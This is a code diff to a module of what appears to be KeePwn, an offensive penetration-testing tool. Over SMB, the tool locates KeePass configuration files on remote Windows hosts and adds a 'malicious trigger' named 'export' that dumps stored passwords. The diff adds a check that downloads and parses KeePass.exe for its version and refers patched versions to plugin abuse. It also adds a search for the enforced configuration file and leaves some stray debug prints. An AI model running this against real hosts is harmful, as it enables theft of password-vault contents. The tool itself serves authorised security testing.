@@ -4,20 +4,48 @@ from pathlib import Path
 from time import sleep
 
 import chardet
+import pefile
 from lxml import etree
 from impacket.smbconnection import SessionError
 from termcolor import cprint, colored
 
-from keepwn.utils.logging import print_error, print_info, print_success, Loader, format_path
+from keepwn.utils.logging import print_error, print_info, print_success, Loader, format_path, print_warning
 from keepwn.utils.parser import parse_mandatory_options
 from keepwn.utils.smb import smb_connect
+from packaging.version import Version
+
+def is_keepass_patched(smb_connection, share):
+    try:
+        path = '\\Program Files\\KeePass Password Safe 2\\KeePass.exe'
+        for file in smb_connection.listPath(share, path):
+            # get keepass version (we download KeePass.exe and parse the binary content)
+            buffer = BytesIO()
+            smb_connection.getFile(share, path, buffer.write)
+            pe = pefile.PE(data=buffer.getvalue())
+            enum_dict = pe.dump_dict()
+            version = enum_dict['Version Information'][0][2][11][b'ProductVersion'].decode("utf-8")
+            version = '.'.join(version.split('.')[0:3])
+
+            if Version(version) >= Version('2.53.1'):
+                return True, version
+            else:
+                return False, version
+    except SessionError as e:
+        pass
+
+    return None, None
 
 
 def get_config_file_path(smb_connection, share, config_path_parameter):
 
+    # we first check if the user-specified configuration path is found on the target
     if config_path_parameter:
         if config_path_parameter.startswith('\\\\') and '$' in config_path_parameter:
             config_path_parameter = config_path_parameter.split('$')[1]
+            print(config_path_parameter)
+        if config_path_parameter[1:3] == ':\\':
+            config_path_parameter = config_path_parameter.split(':')[1]
+            print(config_path_parameter)
         try:
             for file in smb_connection.listPath(share, config_path_parameter):
                 print_info("Found the specified KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, config_path_parameter))))
@@ -28,16 +56,16 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
     else:
         print_info("No KeePass configuration path specified, searching in default locations..")
 
-        # TODO: handle KeePass enforced configuration https://keepass.info/help/kb/config_enf.html
-        # try:
-        #    path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.enforced.xml'
-        #    for file in smb_connection.listPath(share, path):
-        #        print_info("Found enforced KeePass configuration '\\\\{}{}'".format(share, path))
-        #        enforced_config_path = path
-        #except SessionError as e:
-        #    pass  # the file was not found, we immediatly search for the global one
+        # search for the enforced configuration file
+        try:
+            path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.enforced.xml'
+            for file in smb_connection.listPath(share, path):
+                print_info("Found enforced KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, path))))
+                return path
+        except SessionError as e:
+            pass  # the file was not found, we immediatly search for the global one
 
-        # we first look for a global configuration file
+        # search for a global configuration file
         try:
             path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.xml'
             for file in smb_connection.listPath(share, path):
@@ -56,6 +84,7 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
         except SessionError as e:
             pass  # the file was not found
 
+        # search for local configuration files
         local_config_paths = []
         try:
             for file in smb_connection.listPath(share, '\\Users\\*'):
@@ -76,7 +105,7 @@ def get_config_file_path(smb_connection, share, config_path_parameter):
             print_error("No local KeePass configurations found, you can specify a pass with --config if it is somewhere else")
             exit()
         elif len(local_config_paths) >= 1:
-            print_error("Multiple local KeePass configuration found, please use --config to specify one amongst the following:")
+            print_error("Multiple local KeePass configurations found, please use --config to specify one amongst the following:")
             for local_config_path in local_config_paths:
                 cprint("    '{}'".format(local_config_path), 'blue')
             exit()
@@ -157,6 +186,19 @@ def add_trigger(options):
             print_error('Unkown error while connecting to target: {}'.format(str_error))
         return
 
+    # we first look for keepass version, to prevent the user from screwing its penetration test engagement :D
+    patched, version = is_keepass_patched(smb_connection, share)
+    if patched == None:
+        print_warning("Unable to determine KeePass version. Trigger extraction may not work, do you want to keep going? [y/n]".format(version))
+        ans = input('> ')
+        if ans.lower() not in ['y', 'yes', '']:
+            print_success("Safety first, good choice :)")
+            exit()
+    elif patched == True:
+        print_error("Detected KeePass {} > 2.53, you should abuse plugins instead of triggers for passwords extraction, as various safety features were added.".format(version))
+        print("    See https://github.com/d3lb3/KeeFarceReborn for more information on plugin abuse :)")
+        exit()
+
     config_file_path = get_config_file_path(smb_connection, share, options.config_path)
 
     if not config_file_path:
@@ -194,10 +236,9 @@ def add_trigger(options):
         raise
 
     if 'export' in get_triggers_names(smb_connection, share, config_file_path):
-        print_success("Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is currently running).")
+        print_success("Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is already running).")
     else:
         print_error("Unokwn error while adding trigger 'export' to KeePass configuration file.")
-    # TODO: print warning message that the trigger may be overridden if keepass is running (config file reloaded)
 
 
 def clean_trigger(options):
